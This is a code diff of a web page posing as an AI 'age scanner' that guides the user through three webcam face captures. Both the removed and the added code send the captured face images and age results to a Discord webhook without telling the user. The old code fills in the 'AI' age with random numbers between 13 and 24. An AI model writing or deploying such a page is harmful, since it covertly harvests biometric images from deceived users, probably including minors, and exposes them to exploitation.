-                    progressText.textContent = "step 2 of 3: left profile";
+                    progressText.textContent = "step 2 of 3: analyzing left profile";
                     arrowLeft.style.display = 'block';
                     
-                    // Capture and analyze second angle
-                    setTimeout(async () => {
-                        const screenshot = captureScreenshot();
-                        if (screenshot) {
-                            const ageResult = await estimateAgeFromFace(cameraFeed);
-                            sendToDiscord(screenshot, "left profile analysis", ageResult);
-                        }
+                    setTimeout(() => {
+                        // Capture second image
+                        const img2 = captureScreenshot();
+                        capturedImages.push(img2);
                         
                         // Move to step 3
                         setTimeout(() => {
                             scanStep = 2;
+                            updateStepIndicators(2);
                             updateProgress();
                             cameraInstructionText.textContent = "turn face slightly right";
-                            progressText.textContent = "step 3 of 3: right profile";
+                            progressText.textContent = "step 3 of 3: analyzing right profile";
                             arrowLeft.style.display = 'none';
                             arrowRight.style.display = 'block';
                             
-                            // Capture and analyze third angle
-                            setTimeout(async () => {
-                                const screenshot = captureScreenshot();
-                                if (screenshot) {
-                                    const ageResult = await estimateAgeFromFace(cameraFeed);
-                                    sendToDiscord(screenshot, "right profile analysis", ageResult);
-                                }
+                            setTimeout(() => {
+                                // Capture third image
+                                const img3 = captureScreenshot();
+                                capturedImages.push(img3);
                                 
                                 // Complete scan
                                 setTimeout(() => {
@@ -920,49 +1055,26 @@
                 stream.getTracks().forEach(track => track.stop());
             }
             
-            // Final AI analysis
+            // Estimate age
+            finalAgeResult = estimateAge();
+            
+            // Update UI
+            estimatedAge.innerHTML = `${finalAgeResult.age}<span class="age-plus">+</span>`;
+            confidenceText.textContent = `confidence: ${finalAgeResult.confidence}% • age range: ${finalAgeResult.ageLow} - ${finalAgeResult.ageHigh}`;
+            
+            // Create combined image and send to Discord
             setTimeout(async () => {
-                const finalAgeResult = {
-                    age: Math.floor(Math.random() * 12) + 13, // 13-24
-                    confidence: 75 + Math.floor(Math.random() * 20),
-                    ageLow: 10 + Math.floor(Math.random() * 8),
-                    ageHigh: 18 + Math.floor(Math.random() * 10)
-                };
-                
-                // Ensure low < age < high
-                finalAgeResult.ageLow = Math.min(finalAgeResult.age - 2, finalAgeResult.ageLow);
-                finalAgeResult.ageHigh = Math.max(finalAgeResult.age + 2, finalAgeResult.ageHigh);
-                
-                // Update UI with results
-                estimatedAge.innerHTML = `${finalAgeResult.age}<span class="age-plus">+</span>`;
-                confidenceText.textContent = `confidence: ${finalAgeResult.confidence}%`;
-                ageRange.textContent = `${finalAgeResult.ageLow} - ${finalAgeResult.ageHigh}`;
-                agePrecision.textContent = `${Math.min(95, finalAgeResult.confidence + 5)}%`;
-                
-                loadingView.style.display = 'none';
-                
-                // Success rate based on "face detection"
-                const isSuccessful = Math.random() > 0.1;
-                
-                if (isSuccessful) {
+                try {
+                    const combinedImageUrl = await createCombinedImage(capturedImages);
+                    await sendEmbedToDiscord(combinedImageUrl, finalAgeResult);
+                    
+                    loadingView.style.display = 'none';
                     resultsView.style.display = 'block';
                     
-                    // Send final results to Discord
-                    const finalPayload = {
-                        username: 'age scanner ai',
-                        content: `scan complete\nfinal age estimate: ${finalAgeResult.age}\nconfidence: ${finalAgeResult.confidence}%\nage range: ${finalAgeResult.ageLow}-${finalAgeResult.ageHigh}\ntotal scans: ${capturedScreenshots.length}`
-                    };
-                    
-                    fetch(DISCORD_WEBHOOK, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(finalPayload)
-                    }).catch(() => {});
-                    
-                } else {
-                    errorView.style.display = 'block';
+                } catch (error) {
+                    console.error('error:', error);
+                    loadingView.style.display = 'none';
+                    resultsView.style.display = 'block';
                 }
             }, 3000);
         }
@@ -978,7 +1090,7 @@
             arrowLeft.style.display = 'none';
             arrowRight.style.display = 'none';
             progressContainer.style.display = 'none';
-            isScanning = false;
+            updateStepIndicators(0);
         });
         
         // Continue after successful verification
@@ -986,32 +1098,29 @@
             alert("age verification complete");
             resultsView.style.display = 'none';
             initialView.style.display = 'block';
-            capturedScreenshots = [];
         });
         
         // Try again from results
         tryAgainBtn.addEventListener('click', function() {
             resultsView.style.display = 'none';
             initialView.style.display = 'block';
-            capturedScreenshots = [];
         });
         
         // Retry from error
         retryBtn.addEventListener('click', function() {
             errorView.style.display = 'none';
             initialView.style.display = 'block';
-            capturedScreenshots = [];
         });
         
         // Other method from error
         otherMethodBtn.addEventListener('click', function() {
-            alert("please use id verification instead");
+            alert("alternative verification methods are available");
         });
         
         // Initialize
         window.addEventListener('load', function() {
             document.getElementById('face-animation').style.display = 'flex';
-            loadModel();
+            updateStepIndicators(0);
         });
     </script>
 </body>
